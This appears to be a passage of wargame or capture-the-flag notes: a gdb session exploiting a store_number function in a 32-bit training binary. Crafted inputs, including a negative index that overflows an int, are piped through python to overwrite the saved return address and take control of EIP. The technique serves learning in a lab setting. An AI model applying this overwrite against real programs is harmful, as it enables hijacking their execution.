-2147483648 = minimum int

# Let's find where store_number is returning:
=> 0x80486d6 <store_number+166>:	ret
(gdb) x/x $esp
0xffffd51c:	0x080488ef <-- We must find this address in the stack, this is where
							store_number will return

(gdb) b *0x080486d5
(gdb) r < <(python -c 'print "store"' ; python -c 'print "2812782503"' ; python -c 'print "-2147483669"' ; python -c 'print "quit"')
Breakpoint 1, 0x080486d5 in store_number ()

(gdb) x/100wx $esp
0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
0xffffd500:	0xffffd708	0xf7ff0a50	0xa7a7a7a7	0x80000020
0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0x080488ef <- HERE, WE MUST OVERWRITE HERE
0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714

# After some tries to find the right value to put in index, we got this
														  0xa7a7a7a7

(gdb) r < <(python -c 'print "store"' ; python -c 'print "2812782503"' ; python -c 'print "-2147483658"' ; python -c 'print "quit"')

(gdb) x/100wx $esp
0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
0xffffd500:	0xffffd708	0xf7ff0a50	0xa7a7a7a7	0x7ffffff6
0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0xa7a7a7a7 <- VALUE HAS CHANGED
0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714
(gdb) si
0x080486d6 in store_number ()
(gdb) si
0xa7a7a7a7 in ?? () # Nice, we can control EIP now :)
